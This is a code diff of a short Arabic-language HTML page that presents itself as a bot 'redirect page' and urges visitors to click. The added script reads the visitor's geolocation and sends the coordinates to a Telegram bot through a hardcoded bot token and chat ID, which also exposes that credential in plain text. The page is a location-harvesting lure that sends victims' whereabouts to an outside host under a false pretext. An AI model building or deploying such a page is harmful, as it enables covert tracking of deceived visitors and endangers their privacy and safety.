@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title> صفحة توجيه البوت </title>
+  <title>صفحة توجيه البوت</title>
 </head>
 <body>
   <h2>شلونكم يابة اضغط هنا حتى تتوجه للصفحة</h2>
@@ -9,16 +9,28 @@
   <p id="result"></p>
 
   <script>
+    const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
+    const CHAT_ID = "6028485445"
+
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
+
           document.getElementById("result").innerText = `Latitude: ${lat}, Longitude: ${lon}`;
-          // إرسال الموقع إلى سيرفرك
-          fetch(`https://api.telegram.org/bot<7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ>`)
-            .then(response => response.text())
-            .then(data => console.log("تم الإرسال:", data));
+
+          // إرسال الإحداثيات باستخدام sendLocation
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
+            .then(response => response.json())
+            .then(data => {
+              console.log("تم الإرسال:", data);
+              alert("تم إرسال الموقع إلى البوت!");
+            })
+            .catch(error => {
+              console.error("خطأ في الإرسال:", error);
+              alert("فشل إرسال الموقع.");
+            });
         }, () => {
           alert("رفضت مشاركة الموقع.");
         });
